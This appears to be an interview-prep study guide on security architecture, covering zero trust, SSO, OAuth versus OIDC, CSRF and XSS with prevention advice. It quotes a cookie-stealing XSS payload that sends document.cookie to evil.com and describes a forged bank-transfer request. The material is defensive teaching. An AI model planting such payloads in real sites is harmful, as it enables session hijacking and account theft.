# 🟣 **286–295: Security Architecture Deep Dive**

### 286. What is Zero Trust Architecture?
"Traditional network security operates on a 'Castle and Moat' mentality: everything outside the firewall is dangerous, but EVERYTHING inside the intranet is implicitly trusted. If a hacker breaches the VPN, they have free rein to access the entire internal database.

**Zero Trust Architecture** eliminates implicit trust. It operates on the principle: 'Never trust, always verify'.

Every single request between microservices—even if they are sitting on the same physical server inside the same private Kubernetes cluster—must be explicitly authenticated, authorized, and continuously validated. Identity is the primary perimeter, not the IP address."

#### Indepth
To implement Zero Trust, we typically rely on a **Service Mesh** (like Istio). The Service Mesh injects a sidecar proxy into every microservice pod. All traffic between 'Order Service' and 'Payment Service' is automatically upgraded to **mTLS (Mutual TLS)**. This means the Order Service presents a cryptographic certificate validating its identity to the Payment Service, and traffic is fully encrypted on the internal wire, preventing internal packet sniffing even if a bad actor is inside the network.

---

### 287. How do you implement Single Sign-On (SSO) globally?
"I implement SSO using **OAuth 2.0 with OpenID Connect (OIDC)** as the identity layer.

Instead of every microservice verifying passwords (which requires creating 20 different password databases), we configure an **Identity Provider (IdP)** like Keycloak, Okta, or AWS Cognito.

1. The user tries to access the 'Order App'.
2. The Order App redirects the user to the IdP's central login page.
3. The user logs in once.
4. The IdP redirects back to the Order App, providing a temporary Auth Code.
5. The Order App exchanges that code for an **ID Token** (who the user is) and an **Access Token** (what they are allowed to do).
6. When the user navigates to the 'Payment App', it also checks with the IdP, sees the user has a valid active session cookie on the IdP, and instantly issues tokens without asking for a password again."

#### Indepth
For Enterprise B2B SaaS applications, you often have to integrate with the client company's existing Active Directory. Instead of creating new passwords, I configure SAML 2.0 or OIDC federation within my IdP. When a user from `@acmecorp.com` types their email, my IdP seamlessly forwards the authentication request to Acme Corp's Microsoft Entra ID server, inheriting their corporate identity and multi-factor authentication (MFA) policies automatically.

---

### 288. What is the difference between OAuth 2.0 and OpenID Connect (OIDC)?
"**OAuth 2.0** is strictly an *Authorization* protocol. It was designed to grant an application temporary access to an API without handing over passwords (e.g., granting a printing app permission to read your Google Photos, without giving the printing app your Google password). It issues an Opaque Access Token or JWT. It does *not* provide standard information about *who* the user actually is.

**OpenID Connect (OIDC)** is an *Authentication* protocol built directly on top of OAuth 2.0. It standardizes identity. Alongside the Access Token, it issues an **ID Token** (a specifically formatted JWT) that contains standardized claims about the user (e.g., `name`, `email`, `profile_picture`).

We use OIDC when the application needs to say 'Hello, John' on the screen, and OAuth 2.0 when the app just needs to read data from a backend API."

#### Indepth
The core vulnerability in naive implementations is the 'Confused Deputy' problem or token substitution. If an attacker intercepts an OAuth access token meant for Application A and physically sends it to Application B, Application B might blindly trust it. To prevent this, the `aud` (Audience) claim inside the JWT token MUST explicitly state which exact microservice or API Gateway is intended to consume this token.

---

### 289. Explain Cross-Site Request Forgery (CSRF) and how to prevent it.
"CSRF happens when an attacker tricks a user's browser into executing an unwanted action on a site where the user is currently authenticated.

If a user logs into their bank, the bank sets a Session Cookie. If the user then visits `evil.com`, that site can contain a hidden script: `POST bank.com/transfer?amt=1000`. The browser automatically attaches the bank's Session Cookie to that request. The bank sees a valid cookie and executes the transfer.

**How to prevent it:**
1. **Anti-CSRF Tokens (Synchronizer Token Pattern):** The server generates a random token and embeds it in the HTML form. When the user clicks submit, the token must be sent back. `evil.com` cannot read this token because of the Same-Origin Policy.
2. **SameSite Cookie Attribute:** The modern, preferred solution. Setting `Set-Cookie: session_id=xyz; SameSite=Strict` explicitly tells the browser *never* to send this cookie for cross-site requests originating from a different domain."

#### Indepth
If your microservices use stateless JWTs stored in browser `localStorage` and sent via standard `Authorization: Bearer <token>` HTTP headers, you are naturally immune to CSRF, because the browser does not automatically attach `localStorage` data to cross-domain requests. However, storing JWTs in `localStorage` makes you highly vulnerable to XSS (Cross-Site Scripting).

---

### 290. Explain Cross-Site Scripting (XSS) and prevention strategies.
"XSS occurs when an attacker injects malicious JavaScript into a legitimate website, which then executes in the browser of other users viewing that site. 

Example: An attacker posts a blog comment containing `<script>fetch('http://evil.com?cookie=' + document.cookie)</script>`. When an admin views the comment, the script runs and steals their session token.

**How to prevent it:**
1. **Output Encoding/Escaping:** Never render user input directly as HTML. Use frameworks like React or Angular, which automatically escape unsafe characters (e.g., converting `<script>` to `&lt;script&gt;`) before rendering.
2. **Content Security Policy (CSP):** Set a strict CSP HTTP header that forbids the browser from executing inline scripts and dictates exactly which trusted domains it is allowed to download scripts from.
3. **HttpOnly Cookies:** If using session cookies, ALWAYS set the `HttpOnly` flag. This prevents JavaScript (`document.cookie`) from ever accessing the cookie, shutting down token theft via XSS entirely."

#### Indepth
There are three types of XSS: 
1. **Stored XSS** (the payload is saved in the database, like the blog comment example).
2. **Reflected XSS** (the payload is embedded in a malicious URL link, e.g., `site.com/search?q=<script>...`).
3. **DOM-based XSS** (the vulnerability exists entirely in client-side Javascript manipulating the DOM unsafely, e.g., using `innerHTML` instead of `textContent` with unsanitized URL fragments).
